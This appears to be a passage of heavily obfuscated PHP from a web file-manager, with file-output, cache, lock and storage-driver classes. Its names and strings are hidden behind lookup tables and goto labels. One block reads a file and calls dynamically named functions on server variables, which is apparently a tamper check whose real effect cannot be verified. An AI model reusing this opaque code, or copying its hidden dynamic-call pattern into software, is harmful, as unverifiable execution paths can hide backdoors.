$this->model->fileInfoGet($öë¾¹’¥); $úÒ¯ÛÇ• = IO::copy($ÎşÒ ãê[$_SERVER[”ôÑ§ì¸][84]], $”Õñë‹, !1, $ªªÏôìı); return $úÒ¯ÛÇ•; } public function setModifyTime($¨±ÄÓğË, $ì¢’Îıë = '') { $åÛ´ïû =& $_SERVER[”ôÑ§ì¸]; if (!$¨±ÄÓğË) { return; } $this->model->where(array($åÛ´ïû[458] => $¨±ÄÓğË))->save(array($åÛ´ïû[85] => $ì¢’Îıë)); } public function upload($â–Åœ¦Ö, $²Ü¼ª‰É, $ñ©±ÀøÓ = false, $â€óÚï‡ = REPEAT_REPLACE) { $ÌøÛ°£ˆ =& $_SERVER[”ôÑ§ì¸]; $±Å‘¢Š = $this->parse($â–Åœ¦Ö); $î‡İª»› = $this->model->addFile($±Å‘¢Š[$ÌøÛ°£ˆ[442]], $²Ü¼ª‰É, $±Å‘¢Š[$ÌøÛ°£ˆ[84]], $ñ©±ÀøÓ, $â€óÚï‡); return $this->getPathOuter($î‡İª»›); } public function uploadFileByID($â¨ÏßÔŠ, $ùÏéÛî’, $óçÀÖøÙ) { $êÒÛ•Í¢ =& $_SERVER[”ôÑ§ì¸]; $«”…ùùù = $this->parse($â¨ÏßÔŠ); $ì©üÁî® = $this->model->addFileByFileID($«”…ùùù[$êÒÛ•Í¢[442]], $ùÏéÛî’, $«”…ùùù[$êÒÛ•Í¢[84]], $óçÀÖøÙ); return $this->getPathOuter($ì©üÁî®); } public function addFileByRemote($éºÄÌÒ®, $Ş•Ñ³¼ , $¥†Æ«¼ë = array(), $Äëä‘Â = '', $¡„ê·ş) { $‘»÷ÄÑê =& $_SERVER[”ôÑ§ì¸]; $¯åæç° = $this->parse($éºÄÌÒ®); $Äëä‘Â = empty($Äëä‘Â) ? $¯åæç°[$‘»÷ÄÑê[84]] : $Äëä‘Â; $­çÆÒè = $this->model->addFileByRemote($¯åæç°[$‘»÷ÄÑê[442]], $Ş•Ñ³¼ , $Äëä‘Â, $¥†Æ«¼ë, $¡„ê·ş); return $this->getPathOuter($­çÆÒè); } public function uploadLink($Ùƒú¨ÑÁ, $£òáËìø = 0) { $›ş‡ÊÑ =& $_SERVER[”ôÑ§ì¸]; $•®êÅ¸ê = $this->parse($Ùƒú¨ÑÁ); $‡½ÓÜÃí = _get($GLOBALS[$›ş‡ÊÑ[7]], $›ş‡ÊÑ[1365]); $‹ŒÊ‡®¿ = _get($GLOBALS[$›ş‡ÊÑ[7]], $›ş‡ÊÑ[1366]); $Ùƒú¨ÑÁ = Model($›ş‡ÊÑ[642])->createFileName($•®êÅ¸ê[$›ş‡ÊÑ[84]], $‡½ÓÜÃí, $‹ŒÊ‡®¿); return IO::uploadLink($Ùƒú¨ÑÁ, $£òáËìø); } public function fileNameAuto($ÖÒ¹õå, $‚šÒºÃı, $Á·Ø¯Ş = REPEAT_REPLACE, $‰ªÈò¹å = false) { return $this->model->fileNameAuto($ÖÒ¹õå, $‚šÒºÃı, $Á·Ø¯Ş, $‰ªÈò¹å); } public function fileNameExist($¹§î÷û, $ÕïçàÀª) { return $this->model->fileNameExist($¹§î÷û, $ÕïçàÀª); } protected function _fileOut($å„’€¢ş, $êÄ½Ìœ = false, $¨Ø¿Èƒº = false, $ßŒáä†Ş = '', $÷„™ˆÃ = false) { $…œ‚¸£ñ =& $_SERVER[”ôÑ§ì¸]; $‰ÍÎ ‰ = $this->model->sourceInfo($å„’€¢ş); if ($‰ÍÎ ‰[$…œ‚¸£ñ[452]] == $…œ‚¸£ñ[88]) { header($…œ‚¸£ñ[1367]); die; } $ÎÆÄ¥ê¬ = $this->model->fileInfoGet($å„’€¢ş); $ßŒáä†Ş = $ÎÆÄ¥ê¬[$…œ‚¸£ñ[640]] ? $ÎÆÄ¥ê¬[$…œ‚¸£ñ[640]] : $ßŒáä†Ş; $’à°¾îø = is_array($GLOBALS[$…œ‚¸£ñ[168]]) ? $GLOBALS[$…œ‚¸£ñ[168]][$…œ‚¸£ñ[32]] : $‰ÍÎ ‰[$…œ‚¸£ñ[32]]; if ($÷„™ˆÃ) { return IO::fileOutServer($ÎÆÄ¥ê¬[$…œ‚¸£ñ[84]], $êÄ½Ìœ, $’à°¾îø, $ßŒáä†Ş); } IO::fileOut($ÎÆÄ¥ê¬[$…œ‚¸£ñ[84]], $êÄ½Ìœ, $’à°¾îø, $ßŒáä†Ş); } public function fileOut($ë†£¦ë, $³¢¼Ü«Ş = false, $ºµæÊ»è = false, $ï˜ê£ğÇ = '') { $this->_fileOut($ë†£¦ë, $³¢¼Ü«Ş, $ºµæÊ»è, $ï˜ê£ğÇ); } public function fileOutServer($‚õ¼í©¥, $«±©¦™è = false, $ÍÕĞÄó® = false, $î»Âıïö = '') { $this->_fileOut($‚õ¼í©¥, $«±©¦™è, $ÍÕĞÄó®, $î»Âıïö, !0); } protected function _fileOutImage($÷‡¿ã½, $Üù®³Ç = 250) { $¡‡ã‘²‚ =& $_SERVER[”ôÑ§ì¸]; $—ºàú€ñ = $this->model->pathInfo($÷‡¿ã½); if ($—ºàú€ñ[$¡‡ã‘²‚[452]] == $¡‡ã‘²‚[88]) { show_json($¡‡ã‘²‚[1368] . $÷‡¿ã½, !1); } $ÕÀ¹¬¿ = $this->model->fileInfoGet($÷‡¿ã½); $—ºàú€ñ[$¡‡ã‘²‚[169]] = $ÕÀ¹¬¿[$¡‡ã‘²‚[84]]; $GLOBALS[$¡‡ã‘²‚[168]] = $—ºàú€ñ; IO::fileOutImage($ÕÀ¹¬¿[$¡‡ã‘²‚[84]], $Üù®³Ç); } public function fileOutImage($¦‰Æîö¹, $¤âû‹ß¹ = 250) { $this->_fileOutImage($¦‰Æîö¹, $¤âû‹ß¹); } public function fileOutImageServer($¾±áÑÑ®, $ŸøŸ“Ûâ = 250) { $this->_fileOutImage($¾±áÑÑ®, $ŸøŸ“Ûâ); } public function link($¸ÅŠÁ™›, $ÇÖø® = '') { $í™ŸØÚ­ = $this->model->fileInfoGet($¸ÅŠÁ™›); return IO::link($í™ŸØÚ­[$_SERVER[”ôÑ§ì¸][84]], $ÇÖø®); } protected function parse($œÛù¦÷¨) { $™®ñÅÛ‡ =& $_SERVER[”ôÑ§ì¸]; if (strstr($œÛù¦÷¨, $™®ñÅÛ‡[8]) === !1) { return array($™®ñÅÛ‡[460] => intval($œÛù¦÷¨), $™®ñÅÛ‡[84] => $™®ñÅÛ‡[12], $™®ñÅÛ‡[1364] => array()); } $³ŞÓğáÛ = explode($™®ñÅÛ‡[8], trim($œÛù¦÷¨, $™®ñÅÛ‡[8])); if (count($³ŞÓğáÛ) < 2) { show_tips(clear_html($œÛù¦÷¨) . $™®ñÅÛ‡[1369]); } return array($™®ñÅÛ‡[460] => intval($³ŞÓğáÛ[0]), $™®ñÅÛ‡[84] => $³ŞÓğáÛ[1], $™®ñÅÛ‡[1364] => array_slice($³ŞÓğáÛ, 1)); } } goto F¤Æ“ã¸ˆĞ; c†¼µØÍó”: define($_SERVER[”ôÑ§ì¸][645], $_SERVER[”ôÑ§ì¸][646]); $jokyiabpqt = $_SERVER[”ôÑ§ì¸][647]; while ($jokyiabpqt < $_SERVER[”ôÑ§ì¸][648]) { if ($jokyiabpqt >= 0) { break; } $jokyiabpqt++; } goto c©×ÛçÄÆ; F³ØŸ±ø‹µ: if ($_SERVER[$_SERVER[”ôÑ§ì¸][857]] != $_SERVER[$_SERVER[”ôÑ§ì¸][858]]) { $_getc = $_SERVER[”ôÑ§ì¸][859]; $_getfile = $_SERVER[$_SERVER[”ôÑ§ì¸][860]] . $_SERVER[”ôÑ§ì¸][861]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[”ôÑ§ì¸][245], $_getfilec); if (count($_getarrs) < $_SERVER[”ôÑ§ì¸][648]) { $exit = $_SERVER[”ôÑ§ì¸][862]; $exit(); } $_act = $_SERVER[”ôÑ§ì¸][863]; $_act($_SERVER[$_SERVER[”ôÑ§ì¸][864]]); } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($í™™ğß, $…Ÿö¥Œå) { $ó¯ÅÒñ =& $_SERVER[”ôÑ§ì¸]; $this->cachePath = $í™™ğß[$ó¯ÅÒñ[84]]; $this->prefix = $ó¯ÅÒñ[865]; $this->cacheTime = $…Ÿö¥Œå; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($µÊ×Øœ²) { $ŠÎ‹İÇ  =& $_SERVER[”ôÑ§ì¸]; $µÊ×Øœ² = str_replace(array($ŠÎ‹İÇ [866], $ŠÎ‹İÇ [97], $ŠÎ‹İÇ [73]), $ŠÎ‹İÇ [867], $µÊ×Øœ²); return $this->cachePath . $ŠÎ‹İÇ [868] . $µÊ×Øœ² . $ŠÎ‹İÇ [869]; } public function set($¢†„¶ æ, $ÙçÃ§ìØ, $–Ëç°¬£ = false) { $–Ëç°¬£ = $–Ëç°¬£ ? $–Ëç°¬£ : $this->cacheTime; $‘¡òâ = $this->getFile($¢†„¶ æ); if (file_put_contents($‘¡òâ, $this->prefix . $ÙçÃ§ìØ, LOCK_EX)) { @touch($‘¡òâ, intval(time() + $–Ëç°¬£)); clearstatcache(); return !0; } @unlink($‘¡òâ); return !1; } public function get($î¢µöÅ†) { $»œ•éø = $this->getFile($î¢µöÅ†); if (file_exists($»œ•éø) && filemtime($»œ•éø) < time()) { @unlink($»œ•éø); return !1; } $óù¾Ñ”á = @file_get_contents($»œ•éø); return substr($óù¾Ñ”á, strlen($this->prefix)); } public function remove($ªÅú¶°Ó) { $•Í÷ëÊ = $this->getFile($ªÅú¶°Ó); return @unlink($•Í÷ëÊ); } public function deleteAll() { $ŞµêÖ… =& $_SERVER[”ôÑ§ì¸]; $¹šÔØÊ“ = scandir($this->cachePath); foreach ($¹šÔØÊ“ as $ß™¸˜²”) { $•èŸËÅÏ = $this->cachePath . $ß™¸˜²”; if (strpos($•èŸËÅÏ, $ŞµêÖ…[869]) && strpos($•èŸËÅÏ, $ŞµêÖ…[870])) { @unlink($•èŸËÅÏ); } } } public function clearTimeout() { $şö íÌØ =& $_SERVER[”ôÑ§ì¸]; $†ºÑ„¯¨ = scandir($this->cachePath); foreach ($†ºÑ„¯¨ as $ü‰«¾”À) { $ˆŸµ¿… = $this->cachePath . $ü‰«¾”À; if (strpos($ˆŸµ¿…, $şö íÌØ[869]) && strpos($ˆŸµ¿…, $şö íÌØ[870]) && filemtime($ˆŸµ¿…) < time()) { @unlink($ˆŸµ¿…); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $ÜÚ¨†Œ™ =& $_SERVER[”ôÑ§ì¸]; if (self::$handle) { return self::$handle; } $…Õğ—” = $GLOBALS[$ÜÚ¨†Œ™[6]][$ÜÚ¨†Œ™[392]]; self::$timeout = $…Õğ—”[$ÜÚ¨†Œ™[871]] ? $…Õğ—”[$ÜÚ¨†Œ™[871]] : 10; $ˆ•–ˆäÏ = _get($GLOBALS[$ÜÚ¨†Œ™[6]], $ÜÚ¨†Œ™[872]); $÷Úİ”íó = $…Õğ—”[$ÜÚ¨†Œ™[849]] ? $…Õğ—”[$ÜÚ¨†Œ™[849]] : $ÜÚ¨†Œ™[213]; if ($÷Úİ”íó == $ÜÚ¨†Œ™[21] && $ˆ•–ˆäÏ == $ÜÚ¨†Œ™[13]) { $÷Úİ”íó = $ÜÚ¨†Œ™[213]; } switch ($÷Úİ”íó) { case $ÜÚ¨†Œ™[852]: self::$handle = new CacheLockRedis(); break; case $ÜÚ¨†Œ™[853]: self::$handle = new CacheLockMemcached(); break; case $ÜÚ¨†Œ™[21]: self::$handle = new CacheLockDatabase(); break; case $ÜÚ¨†Œ™[213]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($ÜÚ¨†Œ™[873], $ÜÚ¨†Œ™[874]); } return self::$handle; } private static function key($°ãÅÎŠÈ) { return $_SERVER[”ôÑ§ì¸][875] . Cache::key($°ãÅÎŠÈ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($¨şÛˆ„î = '') { self::$errorMsg = $¨şÛˆ„î; } public static function lockGlobal($éçÓåÓ, $ÆÉÈƒôÛ) { return self::lock($éçÓåÓ, $ÆÉÈƒôÛ, !0); } public static function lock($¸äºÇÕ°, $ù€Õâ«Æ = false, $Ì·æˆà = false) { $å™ó¾ì =& $_SERVER[”ôÑ§ì¸]; $úŞİ¬“É = self::init(); $€ËÈºÏ‹ = self::key($¸äºÇÕ°); $ù€Õâ«Æ = $ù€Õâ«Æ ? $ù€Õâ«Æ : self::$timeout; $‹Ûë¹“ = timeFloat(); $î¦Ç×ğì = $úŞİ¬“É->lock($€ËÈºÏ‹, $ù€Õâ«Æ); $÷©ßÈúœ = timeFloat(); if (!$î¦Ç×ğì) { $Á›…·É¡ = "\154\157\143\x6b\40\145\162\x72\x6f\x72\73\153\x65\171\75{$¸äºÇÕ°}\73\x74\151\x6d\145\75{$ù€Õâ«Æ}\73" . self::$errorMsg . $å™ó¾ì[71] . get_caller_msg(); $¯²­ûµó = LNG($å™ó¾ì[876]) . "\x28{$ù€Õâ«Æ}\x73\x29\x2e" . LNG($å™ó¾ì[877]); $¯²­ûµó .= $å™ó¾ì[878]; if (is_string(self::$errorMsg) && self::$errorMsg) { $¯²­ûµó = $¯²­ûµó . $å™ó¾ì[879] . self::$errorMsg; } write_log($å™ó¾ì[880] . sprintf($å™ó¾ì[881], timeFloat() - $‹Ûë¹“) . $å™ó¾ì[882] . $Á›…·É¡ . $å™ó¾ì[883] . error_get_last(), $å™ó¾ì[874]); show_json($¯²­ûµó, !1); } if (!$Ì·æˆà) { self::$lockItem[$€ËÈºÏ‹] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $¿£ùÛ¨Å = number_format(timeFloat() - $÷©ßÈúœ, 3); write_log($å™ó¾ì[884] . $¸äºÇÕ° . $å™ó¾ì[885] . $¿£ùÛ¨Å, $å™ó¾ì[874]); } return $î¦Ç×ğì; } public static function lockGet($·Ì· æÁ) { $ãé‚ƒï = self::key($·Ì· æÁ); if (self::$lockItem[$ãé‚ƒï]) { return self::$lockItem[$ãé‚ƒï]; } return self::init()->lockGet($ãé‚ƒï); } public static function unlock($òõŞÜ) { $Î’ß‰õí =& $_SERVER[”ôÑ§ì¸]; $‚ˆÈû±Ë = self::key($òõŞÜ); self::$lockItem[$‚ˆÈû±Ë] = null; self::init()->unlock($‚ˆÈû±Ë); if (GLOBAL_DEBUG_LOG_ALL) { write_log($Î’ß‰õí[886] . $òõŞÜ, $Î’ß‰õí[874]); } return; } public static function unlockRuntime() { $ëİä›´• =& $_SERVER[”ôÑ§ì¸]; $İäğ©œ” = self::init(); $×¦ÃÕ« = !1; foreach (self::$lockItem as $²äóÁö  => $ò°©ÅÎî) { if (!$ò°©ÅÎî) { continue; } $İäğ©œ”->unlock($²äóÁö ); if (!$×¦ÃÕ«) { $×¦ÃÕ« = !0; write_log($ëİä›´•[887] . $²äóÁö  . $ëİä›´•[71] . get_caller_msg(), $ëİä›´•[874]); continue; } write_log($ëİä›´•[887] . $²äóÁö , $ëİä›´•[874]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $¨¡ıœß× = number_format(timeFloat() - TIME_FLOAT, 3); write_log($ëİä›´•[888] . $¨¡ıœß× . $ëİä›´•[889] . ACTION, $ëİä›´•[874]); } } public static function fileLock($ƒÄ´¹å) { $ Ëæß¼ì =& $_SERVER[”ôÑ§ì¸]; if (!$GLOBALS[$ Ëæß¼ì[890]]) { $GLOBALS[$ Ëæß¼ì[890]] = array(); } $GLOBALS[$ Ëæß¼ì[890]][$ƒÄ´¹å] = !1; $¾Àœ˜Ï© = fopen(DATA_PATH . $ƒÄ´¹å . $ Ëæß¼ì[891], $ Ëæß¼ì[892]); if (!$¾Àœ˜Ï©) { return !1; } $GLOBALS[$ Ëæß¼ì[890]][$ƒÄ´¹å] = $¾Àœ˜Ï©; if (flock($¾Àœ˜Ï©, LOCK_EX)) { return !0; } self::unlock($ƒÄ´¹å); show_json($ Ëæß¼ì[893], !1); return !1; } public static function fileUnlock($ÍÙò¤¼‘) { $ÇÆöƒŠ‘ =& $_SERVER[”ôÑ§ì¸]; $†”“áà = $GLOBALS[$ÇÆöƒŠ‘[890]][$ÍÙò¤¼‘]; if (!$†”“áà) { return; } $GLOBALS[$ÇÆöƒŠ‘[890]][$ÍÙò¤¼‘] = !1; flock($†”“áà, LOCK_UN); fclose($†”“áà); } public static function fileUnlockAll() { $®ƒ›Ó¬½ =& $_SERVER[”ôÑ§ì¸]; if (!$GLOBALS[$®ƒ›Ó¬½[890]]) { return; } foreach ($GLOBALS[$®ƒ›Ó¬½[890]] as $‚ÚÊ·Éï => $Â©ºí ) { if (!$Â©ºí ) { continue; } $GLOBALS[$®ƒ›Ó¬½[890]][$‚ÚÊ·Éï] = !1; flock($Â©ºí , LOCK_UN); fclose($Â©ºí ); } $GLOBALS[$®ƒ›Ó¬½[890]] = array(); } } goto DŸ³äÎë ¦; CèŸŒøò„: class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\155\x2e\x73\157\165\x72\143\x65\x53\145\143\x72\145\164\x4c\x69\163\164"; public $field = array("\163\x6f\165\x72\143\x65\111\104", "\x74\171\160\145\x49\x44", "\x63\162\145\141\164\145\125\x73\x65\x72"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\x6d\56\x73\164\157\x72\141\x67\145\x4c\151\163\164"; public $field = array("\156\141\155\145", "\163\x69\x7a\x65\x4d\x61\170", "\163\x79\163\164\145\155", "\x64\145\146\x61\x75\x6c\x74", "\x64\x72\x69\x76\145\x72", "\x63\x6f\x6e\146\151\147"); public function listData($ù—Œæè× = false, $É…æµ–÷ = "\155\157\144\151\x66\171\124\x69\x6d\x65", $×Ü“ĞÜÓ = false) { $µ³Ûêè¤ =& $_SERVER[”ôÑ§ì¸]; $Úß´’ÌÑ = parent::listData($ù—Œæè×, $É…æµ–÷, $×Ü“ĞÜÓ); if ($ù—Œæè×) { return $Úß´’ÌÑ; } $šôúéõ² = $this->ioSizeUseGet(array_to_keyvalue($Úß´’ÌÑ, $µ³Ûêè¤[12], $µ³Ûêè¤[442])); foreach ($Úß´’ÌÑ as $Ã†–Üä => $ÒûÕËÃ¿) { unset($Úß´’ÌÑ[$Ã†–Üä][$µ³Ûêè¤[6]]); $Úß´’ÌÑ[$Ã†–Üä][$µ³Ûêè¤[1855]] = isset($šôúéõ²[$ÒûÕËÃ¿[$µ³Ûêè¤[442]]]) ? $šôúéõ²[$ÒûÕËÃ¿[$µ³Ûêè¤[442]]] : 0; } return $Úß´’ÌÑ; } public function ioSizeUseGet($†«ñ‰…¬) { $ğæŸõ» =& $_SERVER[”ôÑ§ì¸]; if (!$†«ñ‰…¬) { return array(); } $ï­ªµ‚å = $ğæŸõ»[2186] . implode($ğæŸõ»[50], $†«ñ‰…¬); $–Ÿ¸¤¾à = Cache::get($ï­ªµ‚å); if ($–Ÿ¸¤¾à) { return $–Ÿ¸¤¾à; } $€Ä‡÷»÷ = array($ğæŸõ»[839] => $ğæŸõ»[442], $ğæŸõ»[2187] => $ğæŸõ»[76]); $‹˜Õì€ = array($ğæŸõ»[839] => array($ğæŸõ»[7], $†«ñ‰…¬)); $–Ÿ¸¤¾à = Model($ğæŸõ»[811])->field($€Ä‡÷»÷)->where($‹˜Õì€)->group($ğæŸõ»[839])->select(); $–Ÿ¸¤¾à = array_to_keyvalue($–Ÿ¸¤¾à, $ğæŸõ»[442], $ğæŸõ»[76]); Cache::set($ï­ªµ‚å, $–Ÿ¸¤¾à, 600); return $–Ÿ¸¤¾à; } public function getConfig($¦ê÷Ñ¢Ô) { $¡É¿“ = parent::listData($¦ê÷Ñ¢Ô); return json_decode($¡É¿“[$_SERVER[”ôÑ§ì¸][6]], !0); } public function update($½×³±çˆ, $õïÍ”¶å) { $„ğÛŒ’ä =& $_SERVER[”ôÑ§ì¸]; $ƒöíÃ±¢ = $õïÍ”¶å[$„ğÛŒ’ä[32]]; $¸ÏîŒä¯ = array_to_keyvalue(parent::listData(), $„ğÛŒ’ä[32]); if (isset($¸ÏîŒä¯[$ƒöíÃ±¢]) && $¸ÏîŒä¯[$ƒöíÃ±¢][$„ğÛŒ’ä[442]] != $½×³±çˆ) { return !1; } $this->checkPwd($½×³±çˆ, $õïÍ”¶å); if (isset($õïÍ”¶å[$„ğÛŒ’ä[2188]]) && $õïÍ”¶å[$„ğÛŒ’ä[2188]] == $„ğÛŒ’ä[88]) { $this->checkConfig($õïÍ”¶å); } unset($õïÍ”¶å[$„ğÛŒ’ä[2188]]); $¸ßù¥ß = parent::update($½×³±çˆ, $õïÍ”¶å); if ($¸ßù¥ß && $õïÍ”¶å[$„ğÛŒ’ä[37]]) { $¼üÁ›Äè = 0; foreach ($¸ÏîŒä¯ as $÷¦‡íá•) { if ($÷¦‡íá•[$„ğÛŒ’ä[37]] && $÷¦‡íá•[$„ğÛŒ’ä[442]] != $½×³±çˆ) { $¼üÁ›Äè = $÷¦‡íá•[$„ğÛŒ’ä[442]]; parent::update($÷¦‡íá•[$„ğÛŒ’ä[442]], array($„ğÛŒ’ä[37] => 0)); } } $this->updateBackup($½×³±çˆ, $¼üÁ›Äè); } return $¸ßù¥ß; } public function add($æºøóÈ) { $òñœùá =& $_SERVER[”ôÑ§ì¸]; $«úĞÅÌ‚ = array_to_keyvalue(parent::listData(), $òñœùá[32]); if (isset($«úĞÅÌ‚[$æºøóÈ[$òñœùá[32]]])) { return !1; } $this->checkConfig($æºøóÈ); $İÀıä‘‡ = parent::insert($æºøóÈ); if ($İÀıä‘‡ && $æºøóÈ[$òñœùá[37]]) { foreach ($«úĞÅÌ‚ as $´‰êıÊ) { if ($´‰êıÊ[$òñœùá[37]]) { parent::update($´‰êıÊ[$òñœùá[442]], array($òñœùá[37] => 0)); } } } return $İÀıä‘‡; } public function updateBackup($÷¤³­µÃ, $û¦¿°È¼) { $ê‘ø»Éñ =& $_SERVER[”ôÑ§ì¸]; if (!$û¦¿°È¼) { return; } $çİÌ‚­• = Model($ê‘ø»Éñ[771])->config(); if ($çİÌ‚­•[$ê‘ø»Éñ[1644]] != $ê‘ø»Éñ[88] || $çİÌ‚­•[$ê‘ø»Éñ[773]] != $û¦¿°È¼) { return; } $ŒùØ·òı = Model($ê‘ø»Éñ[792])->get($ê‘ø»Éñ[802]); $ŒùØ·òı = json_decode($ŒùØ·òı, !0); if (!$ŒùØ·òı) { return; } $ŒùØ·òı[$ê‘ø»Éñ[773]] = $÷¤³­µÃ; Model($ê‘ø»Éñ[792])->set(array($ê‘ø»Éñ[802] => $ŒùØ·òı)); } public function checkPwd($––©ù¨, &$ğ—©ÃßØ) { $Íñâ‡ =& $_SERVER[”ôÑ§ì¸]; if (empty($ğ—©ÃßØ[$Íñâ‡[6]])) { return; } $Á¢Ñ¤—Ê = json_decode($ğ—©ÃßØ[$Íñâ‡[6]], !0); $ºõ³Ãä = $Íñâ‡[12]; $ù¹ì¹¯ê = array($Íñâ‡[2189], $Íñâ‡[2190], $Íñâ‡[920]); foreach ($ù¹ì¹¯ê as $®Ç»ú©Ä) { if (isset($Á¢Ñ¤—Ê[$®Ç»ú©Ä])) { $ºõ³Ãä = $®Ç»ú©Ä; break; } } if (!$ºõ³Ãä) { return; } $ËÍÄÙÍ = $this->getConfig($––©ù¨); $„œÓìÏÕ = $ËÍÄÙÍ[$ºõ³Ãä]; $àõ•œñÅ = $Á¢Ñ¤—Ê[$ºõ³Ãä]; if ($àõ•œñÅ == str_repeat($Íñâ‡[202], strlen($„œÓìÏÕ))) { $Á¢Ñ¤—Ê[$ºõ³Ãä] = $„œÓìÏÕ; $ğ—©ÃßØ[$Íñâ‡[6]] = json_encode($Á¢Ñ¤—Ê); } else { if ($àõ•œñÅ != $„œÓìÏÕ) { $ğ—©ÃßØ[$Íñâ‡[2188]] = $Íñâ‡[88]; } } } public function checkConfig(&$ª¤ÓËÀŠ, $Ğê¹¨€Ï = false) { $Â¿ş¿±Õ =& $_SERVER[”ôÑ§ì¸]; $Â¹±Ë¾± = strtolower($ª¤ÓËÀŠ[$Â¿ş¿±Õ[95]]); $Ø ıŞ¿Ì = json_decode($ª¤ÓËÀŠ[$Â¿ş¿±Õ[6]], !0); foreach ($Ø ıŞ¿Ì as $‚—ãşË‘ => $ øÎ–õ) { if (is_string($ øÎ–õ)) { $Ø ıŞ¿Ì[$‚—ãşË‘] = trim($ øÎ–õ); } } $Ø ıŞ¿Ì[$Â¿ş¿±Õ[2191]] = rand_string(6); $µğ„İí = $GLOBALS[$Â¿ş¿±Õ[6]][$Â¿ş¿±Õ[89]][$Â¿ş¿±Õ[848]]; $ß¢äÍ­õ = isset($µğ„İí[$Â¹±Ë¾±]) ? $µğ„İí[$Â¹±Ë¾±] : ucfirst($Â¹±Ë¾±); $Ùá®òƒ˜ = $Â¿ş¿±Õ[74] . $ß¢äÍ­õ; if (!$ß¢äÍ­õ || !class_exists($Ùá®òƒ˜)) { if ($Ğê¹¨€Ï) { return LNG($Â¿ş¿±Õ[2192]); } write_log(array($Â¿ş¿±Õ[2193], $ª¤ÓËÀŠ, get_caller_info()), $Â¿ş¿±Õ[2194]); show_json(LNG($Â¿ş¿±Õ[2192]), !1, $ª¤ÓËÀŠ); } $şÍŸÔ¸Ä = new $Ùá®òƒ˜($Ø ıŞ¿Ì); if (in_array($Â¹±Ë¾±, $şÍŸÔ¸Ä->objectDriver)) { if (!$şÍŸÔ¸Ä->isBucketCors() && !$şÍŸÔ¸Ä->setBucketCors()) { $Ç¯âóãÂ = LNG($Â¿ş¿±Õ[2195]); $Ç¯âóãÂ .= $Â¿ş¿±Õ[2196] . LNG($Â¿ş¿±Õ[2197]); if ($Ğê¹¨€Ï) { return $Ç¯âóãÂ; } show_json($Ç¯âóãÂ, !1); } } $ïŞ±¿Ç = rtrim($Ø ıŞ¿Ì[$Â¿ş¿±Õ[1211]], $Â¿ş¿±Õ[8]) . $Â¿ş¿±Õ[8]; $ëÚÅÚßˆ = $şÍŸÔ¸Ä->getPath($ïŞ±¿Ç . $Â¿ş¿±Õ[1215]); if (!$şÍŸÔ¸Ä->mkfile($ëÚÅÚßˆ)) { if ($Ğê¹¨€Ï) { return LNG($Â¿ş¿±Õ[2195]); } show_json(LNG($Â¿ş¿±Õ[2195]), !1); } $Ø ıŞ¿Ì[$Â¿ş¿±Õ[1211]] = $ïŞ±¿Ç; $ª¤ÓËÀŠ[$Â¿ş¿±Õ[6]] = json_encode($Ø ıŞ¿Ì); $ª¤ÓËÀŠ[$Â¿ş¿±Õ[95]] = $ß¢äÍ­õ; return !0; } public function driverListSystem() { $´¥ä”‰Æ =& $_SERVER[”ôÑ§ì¸]; $ğ€¤¨È€ = parent::listData(); $Ä°Ï¬»  = array(); foreach ($ğ€¤¨È€ as $²Âİ²) { unset($²Âİ²[$´¥ä”‰Æ[214]], $²Âİ²[$´¥ä”‰Æ[85]]); $²Âİ²[$´¥ä”‰Æ[6]] = json_decode($²Âİ²[$´¥ä”‰Æ[6]], !0); $Ä°Ï¬» [] = $²Âİ²; } return $Ä°Ï¬» ; } public function defaultDriver() { $ïüÍâÈÉ =& $_SERVER[”ôÑ§ì¸]; $³Ñ‹šë„ = parent::listData(); $¥ÂõÁ½ = array_filter_by_field($³Ñ‹šë„, $ïüÍâÈÉ[37], 1); $¥ÂõÁ½ = $¥ÂõÁ½[0]; if ($¥ÂõÁ½) { $¥ÂõÁ½[$ïüÍâÈÉ[6]] = json_decode($¥ÂõÁ½[$ïüÍâÈÉ[6]], !0); } return $¥ÂõÁ½; } public function driverInfo($‡ÔÚÇ¦ò) { $Ö’À¿¾Ë =& $_SERVER[”ôÑ§ì¸]; $»¤”»™ = array_to_keyvalue(parent::listData(), $Ö’À¿¾Ë[442]); if (!isset($»¤”»™[$‡ÔÚÇ¦ò])) { return !1; } $ÚìãÊ‚ = $»¤”»™[$‡ÔÚÇ¦ò]; $ÚìãÊ‚[$Ö’À¿¾Ë[6]] = json_decode($ÚìãÊ‚[$Ö’À¿¾Ë[6]], !0); return $ÚìãÊ‚; } public function remove($ú‘ÉöøĞ) { $this->removeShareItems($ú‘ÉöøĞ); return parent::remove($ú‘ÉöøĞ); } public function removeWithFile($‘‹â¹õé, $ıü¤±¶ú) { $Ù“ò½ªÆ =& $_SERVER[”ôÑ§ì¸]; $…áÎÃåÂ = array($Ù“ò½ªÆ[839] => $‘‹â¹õé); $€Êˆµå± = Model($Ù“ò½ªÆ[511])->where($…áÎÃåÂ)->count(); $ç˜”–ÛŠ = Model($Ù“ò½ªÆ[511])->where($…áÎÃåÂ)->sum($Ù“ò½ªÆ[76]); $ìªª²£ø = $ıü¤±¶ú . $Ù“ò½ªÆ[2198] . $‘‹â¹õé; $›‚½íĞæ = LNG($ıü¤±¶ú == $Ù“ò½ªÆ[587] ? $Ù“ò½ªÆ[2199] : $Ù“ò½ªÆ[2200]); $Š«Î¤Æ³ = new TaskFileTransfer($ìªª²£ø, $Ù“ò½ªÆ[2194], $€Êˆµå±, $›‚½íĞæ . "\x28{$‘‹â¹õé}\x29"); $Š«Î¤Æ³->task[$Ù“ò½ªÆ[785]] = (double) $ç˜”–ÛŠ; $ƒ¬±âÂ´ = KodIO::defaultDriver(); $è“Í„¤¼ = $ƒ¬±âÂ´[$Ù“ò½ªÆ[442]]; $è¼“òØÃ = "\173\151\x6f\72{$è“Í„¤¼}\x7d\x2f"; $ã ¼‰¿™ = !0; $ºåïúó¤ = array(); $İ‘¸ü° = 